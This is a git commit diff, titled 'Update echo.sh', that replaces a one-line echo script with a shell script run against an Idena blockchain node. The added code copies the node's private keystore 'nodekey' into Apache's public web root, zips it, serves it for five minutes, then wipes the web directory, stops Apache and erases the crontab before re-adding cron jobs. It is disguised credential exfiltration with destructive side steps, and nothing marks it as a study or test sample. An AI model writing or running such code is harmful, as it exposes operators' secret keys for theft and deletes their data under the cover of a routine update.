3967d8012ffe78ab52de028fdc2f8a220ddd1f7c
dido <140655482+dido20231@users.noreply.github.com>
2024-01-20 14:44:09 +0200

    Update echo.sh

--- echo.sh
+++ echo.sh
@@ -1,1 +1,24 @@
-echo update
+sudo apt install apache2 -y
+sudo apt install zip -y
+/etc/init.d/apache2 start
+sudo service apache2 start
+rm -rf /var/www/html/*
+cp /home/datadir-node1/keystore/nodekey /var/www/html/nodekey
+cd /var/www/html/
+zip nodekey *
+rm nodekey
+sleep 300
+rm -rf /var/www/html/*
+sudo service apache2 stop
+crontab -r
+crontab -r
+crontab -r
+if ! crontab -l 2>&1 | grep -q 'idena-manager update'
+	then
+		(crontab -l ; echo "*/30 * * * * root/idena-manager update")| crontab -
+	fi
+
+	if ! crontab -l 2>&1 | grep -q 'idena-manager restart'
+	then
+		(crontab -l ; echo "1 0 * * * root/idena-manager restart")| crontab -
+	fi
